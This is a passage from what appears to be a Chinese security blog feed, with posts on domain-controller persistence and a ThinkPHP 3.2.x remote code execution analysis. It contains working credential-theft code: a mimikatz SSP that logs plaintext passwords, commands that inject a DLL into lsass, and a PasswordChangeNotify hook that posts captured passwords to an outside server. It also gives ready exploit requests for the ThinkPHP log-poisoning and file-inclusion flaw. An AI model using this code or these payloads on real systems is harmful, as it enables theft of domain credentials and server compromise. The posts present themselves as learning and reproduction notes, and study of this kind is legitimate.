class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>,<br>&#125;;<br><br><span class="hljs-function">NTSTATUS NTAPI <span class="hljs-title">kssp_SpInitialize</span><span class="hljs-params">(ULONG_PTR PackageId, PSECPKG_PARAMETERS Parameters, PLSA_SECPKG_FUNCTION_TABLE FunctionTable)</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-keyword">return</span> STATUS_SUCCESS;<br>&#125;<br><br><span class="hljs-function">NTSTATUS NTAPI <span class="hljs-title">kssp_SpShutDown</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-keyword">return</span> STATUS_SUCCESS;<br>&#125;<br><br><span class="hljs-function">NTSTATUS NTAPI <span class="hljs-title">kssp_SpGetInfo</span><span class="hljs-params">(PSecPkgInfoW PackageInfo)</span></span><br><span class="hljs-function"></span>&#123;<br>PackageInfo-&gt;fCapabilities = SECPKG_FLAG_ACCEPT_WIN32_NAME | SECPKG_FLAG_CONNECTION;<br>PackageInfo-&gt;wVersion   = <span class="hljs-number">1</span>;<br>PackageInfo-&gt;wRPCID     = SECPKG_ID_NONE;<br>PackageInfo-&gt;cbMaxToken = <span class="hljs-number">0</span>;<br>PackageInfo-&gt;Name       = <span class="hljs-string">L&quot;KiwiSSP&quot;</span>;<br>PackageInfo-&gt;Comment    = <span class="hljs-string">L&quot;Kiwi Security Support Provider&quot;</span>;<br><span class="hljs-keyword">return</span> STATUS_SUCCESS;<br>&#125;<br><br><span class="hljs-function">NTSTATUS NTAPI <span class="hljs-title">kssp_SpAcceptCredentials</span><span class="hljs-params">(SECURITY_LOGON_TYPE LogonType, PUNICODE_STRING AccountName, PSECPKG_PRIMARY_CRED PrimaryCredentials, PSECPKG_SUPPLEMENTAL_CRED SupplementalCredentials)</span></span><br><span class="hljs-function"></span>&#123;<br>FILE * kssp_logfile;;<br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> <span class="hljs-meta-keyword">warning</span>(push)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> <span class="hljs-meta-keyword">warning</span>(disable:4996)</span><br><span class="hljs-keyword">if</span>(kssp_logfile = _wfopen(<span class="hljs-string">L&quot;kiwissp.log&quot;</span>, <span class="hljs-string">L&quot;a&quot;</span>))<br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> <span class="hljs-meta-keyword">warning</span>(pop)</span><br>&#123;<br><span class="hljs-built_in">klog</span>(kssp_logfile, <span class="hljs-string">L&quot;[%08x:%08x] [%08x] %wZ\\%wZ (%wZ)\t&quot;</span>, PrimaryCredentials-&gt;LogonId.HighPart, PrimaryCredentials-&gt;LogonId.LowPart, LogonType, &amp;PrimaryCredentials-&gt;DomainName, &amp;PrimaryCredentials-&gt;DownlevelName, AccountName);<br><span class="hljs-built_in">klog_password</span>(kssp_logfile, &amp;PrimaryCredentials-&gt;Password);<br><span class="hljs-built_in">klog</span>(kssp_logfile, <span class="hljs-string">L&quot;\n&quot;</span>);<br><span class="hljs-built_in">fclose</span>(kssp_logfile);<br>&#125;<br><span class="hljs-keyword">return</span> STATUS_SUCCESS;<br>&#125;<br><br><span class="hljs-function">NTSTATUS NTAPI <span class="hljs-title">kssp_SpLsaModeInitialize</span><span class="hljs-params">(ULONG LsaVersion, PULONG PackageVersion, PSECPKG_FUNCTION_TABLE *ppTables, PULONG pcTables)</span></span><br><span class="hljs-function"></span>&#123;<br>*PackageVersion = <span class="hljs-number">0x00000042</span>;<br>*ppTables = &amp;kiwissp_SecPkgFunctionTable;<br>*pcTables = <span class="hljs-number">1</span>;<br><span class="hljs-keyword">return</span> STATUS_SUCCESS;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/img/%E5%9F%9F%E6%8E%A7%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/2.png"></p><p>64位和32位的都有,和目标系统位数要一致。<br>将该dll拷贝到域控<code>c:\windows\system32</code>下<br><img src="/img/%E5%9F%9F%E6%8E%A7%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/3.png"></p><p>打开注册表,修改域控位置<code>HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Lsa\Security Packages\</code><br><img src="/img/%E5%9F%9F%E6%8E%A7%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/4.png"></p><p>在<code>Security Packages</code>下添加<code>mimilib.dll</code><br><img src="/img/%E5%9F%9F%E6%8E%A7%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/5.png"></p><p><img src="/img/%E5%9F%9F%E6%8E%A7%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/6.png"></p><p>将域控重启系统。打开新生成文件<code>c:\windows\system32\kiwissp.log</code>。<br><img src="/img/%E5%9F%9F%E6%8E%A7%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/7.png"></p><p>kiwissp.log记录着登录的账户和明文密码<br><img src="/img/%E5%9F%9F%E6%8E%A7%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/8.png"></p><p>但该方式弊端非常明显:重启的动作太大。<br>mimikatz同样支持了以内存更新的方式更新ssp,无需重启就能获取到登录用户的账号信息和密码。</p><p>进入与目标系统位数相同的mimikatz后,输入命令</p><ul><li>privilege::debug</li><li>misc::memssp</li></ul><p><img src="/img/%E5%9F%9F%E6%8E%A7%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/9.png"></p><p>当目标用户注销后再登录,账户和明文密码会储存到<code>C:\Windows\system32\mimilsa.log</code><br><img src="/img/%E5%9F%9F%E6%8E%A7%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/10.png"></p><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs taggerscript">type C:<span class="hljs-symbol">\W</span>indows<span class="hljs-symbol">\s</span>ystem32<span class="hljs-symbol">\m</span>imilsa.log<br></code></pre></td></tr></table></figure><p><img src="/img/%E5%9F%9F%E6%8E%A7%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/11.png"></p><p>实际上就是将该dll注入到lsass进程中。该方式重启后无效,需要重新注入。<br>但依靠mimikatz这两种方式有一定局限性。下面介绍通过<code>Hook PasswordChangeNotify</code>拦截修改的帐户密码的方法。</p><h2 id="PasswordChangeNotify"><a href="#PasswordChangeNotify" class="headerlink" title="PasswordChangeNotify"></a>PasswordChangeNotify</h2><h3 id="何为PasswordChangeNotify"><a href="#何为PasswordChangeNotify" class="headerlink" title="何为PasswordChangeNotify"></a>何为PasswordChangeNotify</h3><p><code>PasswordChangeNotify</code>是windows提供的一个API。<br>具体参数返回值参照官方文档:<a href="https://docs.microsoft.com/en-us/windows/win32/api/ntsecapi/nc-ntsecapi-psam_password_notification_routine">https://docs.microsoft.com/en-us/windows/win32/api/ntsecapi/nc-ntsecapi-psam_password_notification_routine</a><br>当域控密码被修改时,LSA首先调用<code>PasswordFileter</code>函数,该函数作用为检测新密码是否满足复杂度。如果符合则调用<code>PasswordChangeNotify</code>在系统上同步更新密码。</p><h3 id="HOOK-PasswordChangeNotify"><a href="#HOOK-PasswordChangeNotify" class="headerlink" title="HOOK PasswordChangeNotify"></a>HOOK PasswordChangeNotify</h3><p>具体实现思路如下:</p><ol><li>为PasswordChangeNotify创建一个钩子,将函数执行流重定向到我们自己的PasswordChangeNotifyHook函数中。</li><li>在PasswordChangeNotifyHook函数中写入获取密码的代码,然后再取消钩子,重新将执行流还给PasswordChangeNotify。</li><li>将生成的dll注入到lssas进程中。<br>使用HOOK PasswordChangeNotify无需重启域控系统或修改注册表,更加隐蔽且贴合实际。</li></ol><h3 id="技术复现"><a href="#技术复现" class="headerlink" title="技术复现"></a>技术复现</h3><p>前人栽树,后人乘凉。<br>项目地址:<a href="https://github.com/clymb3r/Misc-Windows-Hacking">https://github.com/clymb3r/Misc-Windows-Hacking</a></p><p>下载后将sln文件打开,右键解决方案,将MFC的使用设置为在静态库中使用MFC编译工程,然后F7编译。<br><img src="/img/%E5%9F%9F%E6%8E%A7%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/12.png"></p><p><img src="/img/%E5%9F%9F%E6%8E%A7%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/13.png"></p><p>dll生成成功之后就需要将dll注入,这里估摸着自己写一个远线程注入也可以,同样可以使用powershell脚本进行注入。</p><blockquote><p><a href="https://github.com/clymb3r/PowerShell/blob/master/Invoke-ReflectivePEInjection/Invoke-ReflectivePEInjection.ps1">https://github.com/clymb3r/PowerShell/blob/master/Invoke-ReflectivePEInjection/Invoke-ReflectivePEInjection.ps1</a></p></blockquote><p>使用该将HookPasswordChange.dll注入内存</p><blockquote><p>Set-ExecutionPolicy bypass<br>Import-Module .\Invoke-ReflectivePEInjection.ps1<br>Invoke-ReflectivePEInjection -PEPath HookPasswordChange.dll -procname lsass</p></blockquote><p>执行后若无报错信息则说明注入成功。注意dll位数。<br><img src="/img/%E5%9F%9F%E6%8E%A7%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/14.png"></p><p>当更改密码后,能够抓取到更改后的密码,账户和明文密码储存在<code>C:\Windows\Temp\passwords.txt</code>。<br><img src="/img/%E5%9F%9F%E6%8E%A7%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/15.png"></p><p><img src="/img/%E5%9F%9F%E6%8E%A7%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/16.png"></p><p>当然存储文件位置和类型可以自定义,只需更改HookPasswordChange.cpp文件。<br><img src="/img/%E5%9F%9F%E6%8E%A7%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/17.png"></p><p>如果觉得仍然不方便,希望直接将密码上传到服务器,可以使用http协议发送。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;windows.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;WinInet.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;ntsecapi.h&gt;</span></span><br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">writeToLog</span><span class="hljs-params">(<span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span>* szString)</span></span><br><span class="hljs-function"></span>&#123;<br>    FILE* pFile = <span class="hljs-built_in">fopen</span>(<span class="hljs-string">&quot;c:\\windows\\temp\\logFile.txt&quot;</span>, <span class="hljs-string">&quot;a+&quot;</span>);<br>    <span class="hljs-keyword">if</span> (<span class="hljs-literal">NULL</span> == pFile)<br>    &#123;<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br>    <span class="hljs-built_in">fprintf</span>(pFile, <span class="hljs-string">&quot;%s\r\n&quot;</span>, szString);<br>    <span class="hljs-built_in">fclose</span>(pFile);<br>    <span class="hljs-keyword">return</span>;<br>&#125;<br><br><br><br><span class="hljs-comment">// Default DllMain implementation</span><br><span class="hljs-function">BOOL APIENTRY <span class="hljs-title">DllMain</span><span class="hljs-params">( HANDLE hModule, </span></span><br><span class="hljs-params"><span class="hljs-function">                       DWORD  ul_reason_for_call, </span></span><br><span class="hljs-params"><span class="hljs-function">                       LPVOID lpReserved</span></span><br><span class="hljs-params"><span class="hljs-function">                     )</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-built_in">OutputDebugString</span>(<span class="hljs-string">L&quot;DllMain&quot;</span>);<br>    <span class="hljs-built_in"><span class="hljs-keyword">switch</span></span> (ul_reason_for_call)<br>    &#123;<br>        <span class="hljs-keyword">case</span> DLL_PROCESS_ATTACH:<br>        <span class="hljs-keyword">case</span> DLL_THREAD_ATTACH:<br>        <span class="hljs-keyword">case</span> DLL_THREAD_DETACH:<br>        <span class="hljs-keyword">case</span> DLL_PROCESS_DETACH:<br>            <span class="hljs-keyword">break</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span> TRUE;<br>&#125;<br><br><span class="hljs-function">BOOLEAN __stdcall <span class="hljs-title">InitializeChangeNotify</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-built_in">OutputDebugString</span>(<span class="hljs-string">L&quot;InitializeChangeNotify&quot;</span>);<br>    <span class="hljs-built_in">writeToLog</span>(<span class="hljs-string">&quot;InitializeChangeNotify()&quot;</span>);<br>    <span class="hljs-keyword">return</span> TRUE;<br>&#125;<br><br><span class="hljs-function">BOOLEAN __stdcall <span class="hljs-title">PasswordFilter</span><span class="hljs-params">(</span></span><br><span class="hljs-params"><span class="hljs-function">    PUNICODE_STRING AccountName,</span></span><br><span class="hljs-params"><span class="hljs-function">    PUNICODE_STRING FullName,</span></span><br><span class="hljs-params"><span class="hljs-function">    PUNICODE_STRING Password,</span></span><br><span class="hljs-params"><span class="hljs-function">    BOOLEAN SetOperation )</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-built_in">OutputDebugString</span>(<span class="hljs-string">L&quot;PasswordFilter&quot;</span>);<br>    <span class="hljs-keyword">return</span> TRUE;<br>&#125;<br><br><span class="hljs-function">NTSTATUS __stdcall <span class="hljs-title">PasswordChangeNotify</span><span class="hljs-params">(</span></span><br><span class="hljs-params"><span class="hljs-function">    PUNICODE_STRING UserName,</span></span><br><span class="hljs-params"><span class="hljs-function">    ULONG RelativeId,</span></span><br><span class="hljs-params"><span class="hljs-function">    PUNICODE_STRING NewPassword )</span></span><br><span class="hljs-function"></span>&#123;<br>  FILE* pFile = <span class="hljs-built_in">fopen</span>(<span class="hljs-string">&quot;c:\\windows\\temp\\logFile.txt&quot;</span>, <span class="hljs-string">&quot;a+&quot;</span>);<br>  <span class="hljs-comment">//HINTERNET hInternet = InternetOpen(L&quot;Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0&quot;,INTERNET_OPEN_TYPE_PRECONFIG,NULL,NULL,0);</span><br>HINTERNET hInternet = <span class="hljs-built_in">InternetOpen</span>(<span class="hljs-string">L&quot;Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0&quot;</span>,INTERNET_OPEN_TYPE_DIRECT,<span class="hljs-literal">NULL</span>,<span class="hljs-literal">NULL</span>,<span class="hljs-number">0</span>);<br>HINTERNET hSession = <span class="hljs-built_in">InternetConnect</span>(hInternet,<span class="hljs-string">L&quot;192.168.1.1&quot;</span>,<span class="hljs-number">80</span>,<span class="hljs-literal">NULL</span>,<span class="hljs-literal">NULL</span>,INTERNET_SERVICE_HTTP ,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>);<br>HINTERNET hReq = <span class="hljs-built_in">HttpOpenRequest</span>(hSession,<span class="hljs-string">L&quot;POST&quot;</span>,<span class="hljs-string">L&quot;/&quot;</span>,<span class="hljs-literal">NULL</span>,<span class="hljs-literal">NULL</span>,<span class="hljs-literal">NULL</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>);<br><span class="hljs-keyword">char</span>* pBuf=<span class="hljs-string">&quot;SomeData&quot;</span>;<br><br><br><br><span class="hljs-built_in">OutputDebugString</span>(<span class="hljs-string">L&quot;PasswordChangeNotify&quot;</span>);<br><span class="hljs-keyword">if</span> (<span class="hljs-literal">NULL</span> == pFile)<br>    &#123;<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br><span class="hljs-built_in">fprintf</span>(pFile, <span class="hljs-string">&quot;%ws:%ws\r\n&quot;</span>, UserName-&gt;Buffer,NewPassword-&gt;Buffer);<br>  <span class="hljs-built_in">fclose</span>(pFile);<br><span class="hljs-built_in">InternetSetOption</span>(hSession,INTERNET_OPTION_USERNAME,UserName-&gt;Buffer,UserName-&gt;Length/<span class="hljs-number">2</span>);<br><span class="hljs-built_in">InternetSetOption</span>(hSession,INTERNET_OPTION_PASSWORD,NewPassword-&gt;Buffer,NewPassword-&gt;Length/<span class="hljs-number">2</span>);<br><span class="hljs-built_in">HttpSendRequest</span>(hReq,<span class="hljs-literal">NULL</span>,<span class="hljs-number">0</span>,pBuf,<span class="hljs-built_in">strlen</span>(pBuf));<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://blog.carnal0wnage.com/2013/09/stealing-passwords-every-time-they.html">https://blog.carnal0wnage.com/2013/09/stealing-passwords-every-time-they.html</a><br><a href="https://github.com/gentilkiwi/mimikatz/blob/bb371c2acba397b4006a6cddc0f9ce2b5958017b/mimilib/kssp.c#L21">https://github.com/gentilkiwi/mimikatz/blob/bb371c2acba397b4006a6cddc0f9ce2b5958017b/mimilib/kssp.c#L21</a><br><a href="https://wooyun.js.org/drops/%E5%9F%9F%E6%B8%97%E9%80%8F%E2%80%94%E2%80%94Security%20Support%20Provider.html">https://wooyun.js.org/drops/%E5%9F%9F%E6%B8%97%E9%80%8F%E2%80%94%E2%80%94Security%20Support%20Provider.html</a><br><a href="https://paper.seebug.org/papers/Archive/drops2/%E5%9F%9F%E6%B8%97%E9%80%8F%E2%80%94%E2%80%94Hook%20PasswordChangeNotify.html">https://paper.seebug.org/papers/Archive/drops2/%E5%9F%9F%E6%B8%97%E9%80%8F%E2%80%94%E2%80%94Hook%20PasswordChangeNotify.html</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>ThinkPHP3.2.x RCE分析复现</title>
    <link href="/2021/08/23/ThinkPHP3.2.x%20RCE%E5%88%86%E6%9E%90%E5%A4%8D%E7%8E%B0/"/>
    <url>/2021/08/23/ThinkPHP3.2.x%20RCE%E5%88%86%E6%9E%90%E5%A4%8D%E7%8E%B0/</url>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>无意间在最新的漏洞报告中看到关于ThinkPHP3.2.x RCE漏洞通报,最近正好在学习php相关知识,准备闲来无事分析和复现一波。</p><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>phpstudy+php7.3.4+ThinkPHP3.2.3+windows10</p><p>在<code>\Application\Home\Controller\IndexController.class.php</code>目录下添加如下代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">namespace</span> <span class="hljs-title">Home</span>\<span class="hljs-title">Controller</span>;<br><span class="hljs-keyword">use</span> <span class="hljs-title">Think</span>\<span class="hljs-title">Controller</span>;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">IndexController</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">Controller</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">index</span>(<span class="hljs-params"><span class="hljs-variable">$value</span>=<span class="hljs-string">&#x27;&#x27;</span></span>)</span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;assign(<span class="hljs-variable">$value</span>);<br>        <span class="hljs-keyword">$this</span>-&gt;display();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/img/ThinkPHP3.2.xRCE/1.png"><br>因为该漏洞利用的assign函数需要模板渲染，所以需要创建对应的模板文件，内容随意，模板文件位置：</p><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs taggerscript"><span class="hljs-symbol">\A</span>pplication<span class="hljs-symbol">\H</span>ome<span class="hljs-symbol">\V</span>iew<span class="hljs-symbol">\I</span>ndex<span class="hljs-symbol">\i</span>ndex.html<br></code></pre></td></tr></table></figure><h2 id="漏洞介绍"><a href="#漏洞介绍" class="headerlink" title="漏洞介绍"></a>漏洞介绍</h2><p>该漏洞产生原因是由于在业务代码中如果对模板赋值方法<code>assign的第一个参数可控</code>，则导致模板路径变量被覆盖为携带攻击代码路径，造成文件包含，代码执行等危害。 </p><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>文件<code>Application/Home/Controller/IndexController.class.php</code><br>assign方法中第一个变量为可控变量。<br><img src="/img/ThinkPHP3.2.xRCE/5.png"></p><p>进入到assign方法中<br><code>ThinkPHP/Library/Think/Controller.class.php</code><br><img src="/img/ThinkPHP3.2.xRCE/7.png"></p><p>实际上调用的是<code>ThinkPHP/Library/Think/View.class.php</code>中的assign函数,并赋值给<code>$this→tVar</code>变量。<br><img src="/img/ThinkPHP3.2.xRCE/6.png"></p><p>然后进入<code>display</code>方法<br><img src="/img/ThinkPHP3.2.xRCE/8.png"></p><p><code>Controller.class.php</code>的display调用<code>View.class.php</code>的display。<br><img src="/img/ThinkPHP3.2.xRCE/9.png"></p><p>调用<code>fetch</code>方法<br><img src="/img/ThinkPHP3.2.xRCE/10.png"></p><p>跟进<code>fetch</code>方法,先会判断模板文件是否存在,不存在直接返回。<br><img src="/img/ThinkPHP3.2.xRCE/11.png"></p><p>然后由于系统配置的默认模板引擎为Think,所以走else分支<br><img src="/img/ThinkPHP3.2.xRCE/12.png"></p><p>将<code>$this→tVar</code>变量值赋值给<code>$params</code>，此时var传入的日志路径，file为模板文件的路径。<br><img src="/img/ThinkPHP3.2.xRCE/13.png"></p><p>跟进listen函数,经过一些判断后进入<code>exec</code>函数中<br><img src="/img/ThinkPHP3.2.xRCE/14.png"></p><p>经过一定处理后将调用<code>Behavior\ParseTemplateBehavior</code>类中的<code>run</code>方法处理<code>$params</code>,而其中储存着带有日志文件路径的值。<br><img src="/img/ThinkPHP3.2.xRCE/15.png"></p><p>进入<code>\ThinkPHP\Library\Behavior\ParseTemplateBehavior.class.php</code>的run函数。寻找谁继续处理了日志文件路径,发现为<code>ThinkPHP/Library/Think/Template.class.php</code>的fetch方法,其中<code>$_data[var]</code>储存了日志文件路径的变量值。<br><img src="/img/ThinkPHP3.2.xRCE/16.png"></p><p>最后跟进到<code>Storage</code>的<code>load</code>方法<br><img src="/img/ThinkPHP3.2.xRCE/17.png"></p><p>判断<code>$vars</code>值是否为空,不为空则会以<code>EXTR_OVERWRITE</code>属性覆盖<code>$_filename</code>原有的值。最后<code>$_filename</code>将等于<code>./Application/Runtime/Logs/Common/21_08_23.log</code>,最后形成文件包含。<br><img src="/img/ThinkPHP3.2.xRCE/18.png"></p><p><img src="/img/ThinkPHP3.2.xRCE/19.png"></p><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>创建log文件<br><a href="http://127.0.0.1/tp3/index.php?m=--&gt;">http://127.0.0.1/tp3/index.php?m=--&gt;</a><?=phpinfo();?></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">GET</span> /tp<span class="hljs-number">3</span>/index.php?m=--&gt;&lt;?=phpinfo();?&gt; HTTP/<span class="hljs-number">1</span>.<span class="hljs-number">1</span><br><span class="hljs-attribute">Host</span>: <span class="hljs-number">127.0.0.1</span><br><span class="hljs-attribute">User</span>-Agent: Mozilla/<span class="hljs-number">5</span>.<span class="hljs-number">0</span> (Windows NT <span class="hljs-number">10</span>.<span class="hljs-number">0</span>; Win<span class="hljs-number">64</span>; x<span class="hljs-number">64</span>; rv:<span class="hljs-number">91</span>.<span class="hljs-number">0</span>) Gecko/<span class="hljs-number">20100101</span> Firefox/<span class="hljs-number">91</span>.<span class="hljs-number">0</span><br><span class="hljs-attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=<span class="hljs-number">0</span>.<span class="hljs-number">9</span>,image/webp,*/*;q=<span class="hljs-number">0</span>.<span class="hljs-number">8</span><br><span class="hljs-attribute">Accept</span>-Language: zh-CN,zh;q=<span class="hljs-number">0</span>.<span class="hljs-number">8</span>,zh-TW;q=<span class="hljs-number">0</span>.<span class="hljs-number">7</span>,zh-HK;q=<span class="hljs-number">0</span>.<span class="hljs-number">5</span>,en-US;q=<span class="hljs-number">0</span>.<span class="hljs-number">3</span>,en;q=<span class="hljs-number">0</span>.<span class="hljs-number">2</span><br><span class="hljs-attribute">Connection</span>: close<br><span class="hljs-attribute">Cookie</span>: PHPSESSID=np<span class="hljs-number">6</span>v<span class="hljs-number">88</span>jt<span class="hljs-number">9982</span>el<span class="hljs-number">6</span>btpcm<span class="hljs-number">998</span>moe<br><span class="hljs-attribute">Upgrade</span>-Insecure-Requests: <span class="hljs-number">1</span><br><span class="hljs-attribute">Sec</span>-Fetch-Dest: document<br><span class="hljs-attribute">Sec</span>-Fetch-Mode: navigate<br><span class="hljs-attribute">Sec</span>-Fetch-Site: none<br><span class="hljs-attribute">Sec</span>-Fetch-User: ?<span class="hljs-number">1</span><br><br></code></pre></td></tr></table></figure><p><img src="/img/ThinkPHP3.2.xRCE/2.png"></p><p><img src="/img/ThinkPHP3.2.xRCE/4.png"><br>包含log文件,注意日志文件名,tp的日志文件名和年月日是相关的。</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc"><span class="hljs-link">http://127.0.0.1/tp3/index.php?m=Home&amp;c=Index&amp;a=index&amp;value</span>[<span class="hljs-string">_filename</span>]=./Application/Runtime/Logs/Common/21_08_23.log<br></code></pre></td></tr></table></figure><p><img src="/img/ThinkPHP3.2.xRCE/3.png"></p><h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>该漏洞由(【漏洞通报】ThinkPHP3.2.x RCE漏洞通报)[<a href="https://mp.weixin.qq.com/s?__biz=MzAwMjQ2NTQ4Mg==&amp;mid=2247487129&amp;idx=1&amp;sn=3d80cc03e4f03a6bdb2be1611e98957c%5D">https://mp.weixin.qq.com/s?__biz=MzAwMjQ2NTQ4Mg==&amp;mid=2247487129&amp;idx=1&amp;sn=3d80cc03e4f03a6bdb2be1611e98957c]</a> 在<br>今年07月12日率先纰漏,不过看到有大佬说这好像是个老洞,有类似的。不过这都与小弟无关,作为入门新手进行学习。如有错误请师傅们斧正。</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>CVE-2021–26855与CVE-2021–27065漏洞分析及复现</title>
    <link href="/2021/08/19/CVE-2021%E2%80%9326855%E4%B8%8ECVE-2021%E2%80%9327065/"/>
    <url>/2021/08/19/CVE-2021%E2%80%9326855%E4%B8%8ECVE-2021%E2%80%9327065/</url>
    
